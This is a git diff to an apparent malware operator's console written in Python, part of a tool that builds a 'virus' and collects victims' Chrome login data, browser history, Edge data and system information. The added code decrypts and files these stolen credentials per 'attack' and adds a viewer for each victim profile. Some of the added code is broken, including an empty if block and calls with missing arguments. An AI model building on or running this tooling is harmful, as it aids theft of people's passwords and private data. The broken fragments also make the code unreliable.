@@ -175,6 +175,15 @@ def opening_data(name='',data=''):
     else:data_get=None
     return data_get
 #related to devlopment 
+def show_files(list_dir,bool_dir_search):
+    print(colored('-'*28+' All_Extracted_Fills '+'-'*28,'yellow'))
+    print(colored("{:<{}}-    {:<{}}-  {} -   {}".format("num",6,'File names',40,'encryption','file type',)+'\n'+'-'*78,'light_yellow'))
+    for num,value in enumerate(list_dir,start=1):
+        encryption_staus='True' if value.endswith('new') else 'False'
+        type_file = 'TXT' if value.endswith('.txt') else ('Python' if value.endswith('.py') else ('xlsx' if value.endswith('.xlsx') else ('docx' if value.endswith('.docx') else ('pptx' if value.endswith('.pptx') else ('xls' if value.endswith('.xls') else ('doc' if value.endswith('.doc') else ('rtf' if value.endswith('.rtf') else ('msg' if value.endswith('.msg') else ('eml' if value.endswith('.eml') else ('csv' if value.endswith('.csv') else ('xml' if value.endswith('.xml') else ('html' if value.endswith('.html') else ('mht' if value.endswith('.mht') else ('odt' if value.endswith('.odt') else ('ods' if value.endswith('.ods') else ('odp' if value.endswith('.odp') else ('odf' if value.endswith('.odf') else ('dotx' if value.endswith('.dotx') else ('dotm' if value.endswith('.dotm') else ('dot' if value.endswith('.dot') else 'File'))))))))))))))))))))
+        print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored(f"[{num}]",'light_yellow'),15,colored(str(value),'magenta'),49,colored(str(encryption_staus),'blue'),19,colored(str(type_file),'red')))
+    print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored("[999]",'light_yellow'),15,colored('Dir_search','yellow'),49,colored('None','blue'),19,colored('Dir','light_red'))) if bool_dir_search else None
+    response=input(colored('([n]for going back)enter your response here:  ','red'))
 def number_decoding(number:str,key:str):
     k=key.split('0');k.pop(k.index(''))
     w='abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
@@ -421,7 +430,6 @@ def about_me():
         elif response.lower()=='3':print(colored('link opening--> github-> Akkiraj1234 ','magenta'));time.sleep(1);webbrowser.open("https://github.com/Akkiraj1234")
         elif response.lower()=='4':break
         else:input(colored('you typed something wrong','red'))
-#check it with every steps-------------------
 def collecting_data(info_resorse):
     skull_img(True)
     print(' '*16+colored('you colecting the data offline show the','yellow'))
@@ -439,6 +447,9 @@ def collecting_data(info_resorse):
     encryption_key=json_data["encryption_key"]
     data_able_to_collect=json_data["data_able_to_collect"]
     staus=json_data["status"]
+    error_file1=[]
+    error_file2=[]
+    file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
     if os.path.exists(info_resorse+'\\'+name_of_attack+'dir'):
         print(colored('account for extraction of data has been found :)','yellow'))
         if input('you wanna continue [y/n]').lower()=='y':pass
@@ -449,9 +460,6 @@ def collecting_data(info_resorse):
         data["data_resived_time"]=staus
         data["last_time_open"]=str(datetime.now())
         print(colored('status data has been updated....','blue'))
-        file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
-        error_file1=[]
-        error_file2=[]
         for file in file_list:
             if os.path.exists(path_input+'\\'+file+'new'):
                 try:
@@ -467,11 +475,12 @@ def collecting_data(info_resorse):
                 print('---------------------------------------------------------------------------------------')
             elif os.path.exists(path_input+'\\'+file):
                 print(colored('file found------','yellow'),file)
-                try:shutil.move(path_input+'\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data');print(colored('data_saved in path',info_resorse+'\\'+name_of_attack+'\\collected_data\\'+file,' -sucsessfull','light_blue'))
+                try:shutil.move(path_input+'\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data');print(colored('data_saved in path'+info_resorse+'\\'+name_of_attack+'\\collected_data\\'+file+' -sucsessfull','light_blue'))
                 except Exception as e:
                     print(colored('failed to move data from {} this directory to {} this directory Error {}'.format(str(path_input+'\\'+file),str(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data'),e),'red'))
                     error_file1.append(file)
                 print('---------------------------------------------------------------------------------------')
+            elif not os.path.exists(path_input+'\\'+file):pass
             else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
         if os.path.exists(path_input+'\\dir_search_new'):
             print(colored('files found in dir_search_new folder encrypted-files','yellow'))
@@ -492,23 +501,125 @@ def collecting_data(info_resorse):
             for file in (listfiles:=os.listdir(path_input+'\\dir_search')):
                 try:
                     print(colored('file name {} move to other directory - in progress'.format(file),'yellow'))
-                    shutil.move(path_input+'\\dir_search\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file)
+                    shutil.move(path_input+'\\dir_search\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\')
                     print(colored('file name {} move to other directory - sucsessfull'.format(file),'blue'),'path- ',info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file,'\n','-'*87)
                 except Exception as e:
                     print(colored('file name {} move to other directory - Failed Error-> {}'.format(file,e),'red'),'\n','-'*87)
                     error_file2.append(file)
+        elif not os.path.exists(path_input+'\\dir_search'):pass
         else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
-        if not bool(error_file1) and bool(error_file2):
-            if input('you wanna delet the directory'+path_input+'\\app_data'+'its no loger in use [y/n]')=='y':
-                try:shutil.rmtree(path_input)#dont delete when there is an error in any file
-                except Exception as e:print('')#if there is no eror ask before deletaion
+        if not bool(error_file1) and not bool(error_file2):
+            if input(colored('you wanna delet the directory'+path_input+'\\app_data'+'its no loger in use [y/n]','light_red'))=='y':
+                try:shutil.rmtree(path_input)
+                except Exception as e:print(colored('/!\\ error in deletaion delet it manually'+e,'red'))
             else:pass
     else:
+        print(colored('this attack not made on this devies or maybe resource file deleted u can just veiew the content of file ','light_red'))
+        print(colored('data found in the directory '+path_input,'yellow'))
+        print(colored('if its encrypted its decrypte the data or if not its pass','blue'))
         if input('you wanna continue [y/n]').lower()=='y':pass
         else: return None
+        for file in file_list:
+            if os.path.exists(path_input+'\\'+file+'new'):
+                try:
+                    print(colored('encrypted file found------','yellow'),file)
+                    with open(path_input+'\\'+file+'new','r',encoding='Utf-8')as data:
+                        with open(path_input+'\\'+file,'w+',encoding='Utf-8') as saving_file:saving_file.write(number_decoding(data.read(),encryption_key))
+                        print(colored('decryption of encrtpted file sucseccfull','blue'))
+                    print(colored('data_saved in path'+path_input+'\\'+file,'light_blue'),'-sucsessfull')
+                    print(colored('use data_viewer tab in main.py to view data and content','blue'))
+                    os.remove(path_input+'\\'+file+'new')
+                except Exception as e:
+                    print(colored(f'data_saving failed ERROR- {e}','red'))
+                    error_file1.append(file)
+                print('---------------------------------------------------------------------------------------')
+            elif os.path.exists(path_input+'\\'+file):
+                print(colored('file found------','yellow'),file)
+                print(colored('data not encrypted -skiping'),'red')
+                print('---------------------------------------------------------------------------------------')
+            elif not os.path.exists(path_input+'\\'+file):pass
+            else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
+        if os.path.exists(path_input+'\\dir_search_new'):
+            print(colored('files found in dir_search_new --folder encrypted-files','yellow'))
+            os.mkdir(path_input+'\\dir_search') if not os.path.exists(path_input+'\\dir_search') else None
+            for file in (listfiles:=os.listdir(path_input+'\\dir_search_new')):
+                try:
+                    print(colored(f'encypted file trying to decrypt {file}','yellow'))
+                    with open(path_input+'\\dir_search_new\\'+file,'r',encoding='Utf-8')as file1:decode_str=number_decoding(file1.read(),encryption_key)
+                    print(colored('encryption file -sucsessfull :) saving the file to {}'.format(path_input+'\\dir_search\\'+file.replace('-','.')[:-3]),'blue'))
+                    with open(path_input+'\\dir_search\\'+file.replace('-','.')[:-3],'wb+')as byte:byte.write(eval(decode_str))
+                    print(colored('data_saved in path -sucessfully :)'+path_input+'\\dir_search\\'+file.replace('-','.')[:-3],'blue'),'\n'+'-'*87)
+                    os.remove(path_input+'\\dir_search_new\\'+file)
+                except Exception as e:
+                    print(colored('there was an errror while working with data error-'+e,'red'),'\n'+'-'*87)
+                    error_file2.append(file)
+            if not bool(error_file1) and not bool(error_file2):
+                if input(colored('you wanna delet the directory'+path_input+'\\dir_search_new'+'its no loger in use [y/n]','light_red'))=='y':
+                    try:shutil.rmtree(path_input+'\\dir_search_new')
+                    except Exception as e:print(colored('/!\\ error in deletaion delet it manually'+e,'red'))
+                else:pass
+        elif os.path.exists(path_input+'\\dir_search'):
+            print(colored('files found in dir_search folder --unencrypted-files','yellow'))
+            for file in os.listdir(path_input+'\\dir_search'):
+                print(colored('file_found without encryption u can directoly accsess them','blue'),'---',file)
+                print(colored('path of file==> '+path_input+'\\dir_search\\'+file,'cyan')+'\n'+'-'*87)
+        elif not os.path.exists(path_input+'\\dir_search'):pass
+        else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
+        print(colored('go to use data_viewer tab hint(main.py option-[3]) and put this path there to view data this part work is to extract the data decrypt them and save it path thank u :)','blue'))
     print('use data_viewer tab in main.py hint-option[3] to view data and content')
     nothing=input(colored('all data has been extracted tap anything and enter to continue','yellow'))
-
+def viwing_data(info_resorse):
+    while True:
+        while True:
+            skull_img(True)
+            if os.path.exists(info_resorse):pass
+            else:return False
+            print(colored(' '*20+'which profile data u wanna see?','yellow'))
+            for num,folder in enumerate((list_of_file:=os.listdir(info_resorse)),start=0):
+                print(colored(' '*25+'[{}] - {}'.format(str(num),str(folder)),'blue'))
+            print(colored(' '*25+'[99] - spacify path ','light_blue'))
+            response=input(colored(' '*20+'([n]for back) enter ur respose here ','red'))
+            if response=='n':return None
+            elif response.isdigit() and int(response)>=0 and int(response)<=len(list_of_file)-1:anser=True;break
+            elif response=='99':anser=False;break
+            elif response.isdigit() and int(response)<=0 or int(response)>len(list_of_file):print(colored(' '*20+'you typed number out of range'))
+            else:nothing=input(colored(' '*20+'you type something wrong /?\\ enter to continue','red'))
+        if anser:
+            while True:
+                skull_img(True)
+                if os.path.exists(info_resorse+'\\'+list_of_file[int(response)]):
+                    print(colored(' '*20+'what u wanna see here?','yellow'))
+                    print(colored(' '*23+'[1] data gatered ','blue'))
+                    print(colored(' '*23+'[2] info about the hack','blue'))
+                    print(colored(' '*23+'[3] go back','blue'))
+                    answer=input(colored(' '*20+'enter ur response here ','red'))
+                    if answer=='1':
+                        path=os.listdir(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
+                        list_dir=os.listdir(path)
+                        if os.path.exists(path+'\\dir_search'):
+                            
+                        show_files(list_dir)
+                    elif answer=='2':print('under proseess');time.sleep(2)
+                    elif answer=='3':break
+                    else:nothing=input(colored(''*20+'type under given option','red'));continue
+                else:nothing=input(colored(' '*15+'There is some error','red'));break
+        else:
+            while True:
+                skull_img(True)
+                path=input('enter the path where file is :')
+                if os.path.exists():
+                    pass
+                else:continue
+                print(colored(' '*20+'what u wanna see here?','yellow'))
+                print(colored(' '*23+'[1] data gatered ','blue'))
+                print(colored(' '*23+'[2] info about the hack','blue'))
+                print(colored(' '*23+'[3] go back','blue'))
+                answer=input(colored(' '*20+'enter ur response here ','red'))
+                if answer=='1':print('under proseess');time.sleep(2)
+                elif answer=='2':print('under proseess');time.sleep(2)
+                elif answer=='3':break
+                else:nothing=input(colored(''*20+'type under given option','red'));continue
+                
 
 #main code begings from here:---=>
 #first screen........
@@ -532,9 +643,9 @@ while True:
         creating_virus(internt_usees,dev_resorse+'\\row_virus.py',info_resorse+'\\'+target_namae+'dir',target_namae,info_resorse+'\\'+target_namae+'dir'+'\\database\\info.json')
     elif response=='2':
         if internt_usees:=response1(creating=False)=='n':continue
-        if collecting_data(info_resorse)=='n':continue
+        if info:=collecting_data(info_resorse)=='n':continue
     elif response=='3':
-        pass
+        viwing_data(info_resorse)
     elif response=='4':
         about_me()
     elif response=='5':
